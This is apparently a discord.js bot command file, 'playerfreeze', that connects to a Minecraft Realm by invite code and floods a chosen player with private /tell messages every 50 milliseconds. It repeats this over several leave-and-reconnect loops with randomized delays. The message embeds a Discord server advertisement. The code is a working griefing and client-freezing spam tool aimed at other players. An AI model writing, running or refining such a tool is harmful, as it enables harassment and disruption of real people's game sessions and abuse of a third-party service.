const { SlashCommandBuilder } = require('discord.js')
const { panels } = require('../ui/panels')
const { defer, edit, updateMessage } = require('../ui/respond')
const { connectRealm } = require('../core/connector')
const { UserError } = require('../utils/errors')
const { describeDisconnect } = require('../core/disconnect-reasons')
const log = require('../utils/logger')

const MAX_LOOPS = 5 //only 5 as players usally leave 
const MESSAGE_INTERVAL_MS = 50
const STAY_MIN_MS = 15_000
const STAY_MAX_MS = 30_000
const RECONNECT_MIN_MS = 30_000
const RECONNECT_MAX_MS = 60_000
const loops = new Map()

const randomDuration = (min, max) => Math.floor(min + Math.random() * (max - min + 1))

const sleep = ms => new Promise(resolve => setTimeout(resolve, ms))

function stopLoop(userId) {
  const state = loops.get(userId)
  if (!state) return false
  state.stopped = true
  if (state.interval) clearInterval(state.interval)
  if (state.timer) clearTimeout(state.timer)
  loops.delete(userId)
  return true
}

async function notifyEnded({ session, reason, disconnect }) {
  const state = loops.get(session.userId)
  if (!state) return
  if (state.plannedLeave) return

  stopLoop(session.userId)

  const failure = disconnect
    ? describeDisconnect(disconnect)
    : { title: 'Connection closed', message: reason || 'The Realm connection was closed.' }

  try {
    await updateMessage(session, panels.error(failure.title, failure.message))
  } catch (error) {
    log.warn('Could not report freeze disconnect', error?.message ?? error)
  }
}

const data = new SlashCommandBuilder()
  .setName('playerfreeze')
  .setDescription('Freeze a player with ice')
  .addStringOption(option => option
    .setName('player')
    .setDescription('Player to Freeze')
    .setRequired(true))
  .addStringOption(option => option
    .setName('realmcode')
    .setDescription('Realm invite code')
    .setRequired(true))
  .addIntegerOption(option => option
    .setName('loops')
    .setDescription(`Number of freeze loops (1-${MAX_LOOPS})`)
    .setMinValue(1)
    .setMaxValue(MAX_LOOPS)
    .setRequired(true))

async function updateFreezeEmbed(state, session, totalLoops, description) {
  if (!session) return
  await updateMessage(session, panels.freezeRealm(session, state.completed, totalLoops, description))
}

async function sendDuringStay(state, session, player) {
  const startedAt = Date.now()
  const stayMs = randomDuration(STAY_MIN_MS, STAY_MAX_MS)

  state.interval = setInterval(() => {
    if (state.stopped || !session.realm.connected) return
    session.realm.externalTell(player, state.message).catch(error => {
      if (!state.stopped) log.warn('Freeze message failed', error?.message ?? error)
    })
  }, MESSAGE_INTERVAL_MS)
  
  //uses /tell instead so it freezes a single player 
  await session.realm.externalTell(player, state.message)

  while (!state.stopped && Date.now() - startedAt < stayMs) {
    await sleep(Math.min(250, stayMs - (Date.now() - startedAt)))
  }

  if (state.interval) {
    clearInterval(state.interval)
    state.interval = null
  }

  return !state.stopped
}

async function runFreeze(userId, session, player, totalLoops) {
  const state = loops.get(userId)
  if (!state || state.stopped) return

  try {
    const stayed = await sendDuringStay(state, session, player)
    if (!stayed) return

    state.completed += 1
    const final = state.completed >= totalLoops

    if (final) {
      state.plannedLeave = true
      await session.realm.leave('Freeze operation completed')
      await updateFreezeEmbed(state, session, totalLoops, 'Freeze operation completed')
      loops.delete(userId)
      return
    }

    state.plannedLeave = true
    await session.realm.leave('Preparing to reconnect')
    state.plannedLeave = false

    const reconnectMs = randomDuration(RECONNECT_MIN_MS, RECONNECT_MAX_MS)
    await updateFreezeEmbed(state, session, totalLoops, `Waiting ${Math.ceil(reconnectMs / 1000)}s before reconnecting`)
    await sleep(reconnectMs)

    if (state.stopped) return

    await updateFreezeEmbed(state, session, totalLoops, 'Reconnecting to the Realm')

    const nextSession = await connectRealm({
      userId,
      input: state.input,
      accounts: state.accounts,
      config: state.config
    })

    nextSession.interaction = state.interaction
    sessionsAdd(state, nextSession)
    state.session = nextSession

    await updateFreezeEmbed(state, nextSession, totalLoops, 'Covering the realm with ice')
    await runFreeze(userId, nextSession, player, totalLoops)
  } catch (error) {
    stopLoop(userId)

    const failure = error instanceof UserError
      ? error
      : new UserError('Freeze failed', error?.message || 'The Realm connection failed.')

    if (error?.message !== 'Realm is not connected') {
      log.warn('Freeze loop failed', error?.message ?? error)
    }

    try {
      const active = state?.session ?? session
      await updateMessage(active, panels.error(failure.title, failure.message))
    } catch (reportError) {
      log.warn('Could not report freeze failure', reportError?.message ?? reportError)
    }

    await state?.sessions?.end(userId, 'Freeze operation failed').catch(() => {})
  }
}

function sessionsAdd(state, session) {
  state.sessions.add(state.userId, session, notifyEnded)
}

async function execute(interaction, { config, accounts, sessions, whitelist }) {
  const userId = interaction.user.id
  const player = interaction.options.getString('player', true).trim()
  const input = interaction.options.getString('realmcode', true).trim()
  const totalLoops = interaction.options.getInteger('loops', true)

  await defer(interaction, config.ephemeral)

  if (whitelist?.isWhitelisted(input)) return edit(interaction, panels.realmWhitelisted())

  if (!accounts.has(userId)) return edit(interaction, panels.needsAccount())
  if (loops.has(userId) || sessions.get(userId)) return edit(interaction, panels.error('Already running', 'Stop your current freeze first.'))
  if (sessions.size >= config.maxSessions) return edit(interaction, panels.atCapacity())
  if (!sessions.claim(userId)) return edit(interaction, panels.error('Freeze in progress', 'A Freeze Request is already running.'))

  try {
    await edit(interaction, panels.joining(input))
    const session = await connectRealm({ userId, input, accounts, config, whitelist })
    session.interaction = interaction
    sessions.add(userId, session, notifyEnded)

    const state = {
      userId,
      session,
      sessions,
      accounts,
      config,
      input,
      interaction,
      message: `${''.repeat(100)} .gg/s3unJ6uhZ3`,  
      completed: 0,
      interval: null,
      timer: null,
      stopped: false,
      plannedLeave: false
    }
    loops.set(userId, state)

    session.message = await edit(interaction, panels.freezePlayer(session, player, 0, totalLoops, 'Covering the player with ice'))
    await runFreeze(userId, session, player, totalLoops)
  } catch (error) {
    stopLoop(userId)
    sessions.release(userId)
    const failure = error instanceof UserError ? error : new UserError('Freeze failed', 'The Realm connection failed.')
    if (!(error instanceof UserError)) log.error('Freeze command failed', error)
    if (failure.title === 'Realm is Whitelisted') {
      await edit(interaction, panels.realmWhitelisted())
    } else {
      await edit(interaction, panels.error(failure.title, failure.message))
    }
  }
}

module.exports = { data, execute, stopLoop }
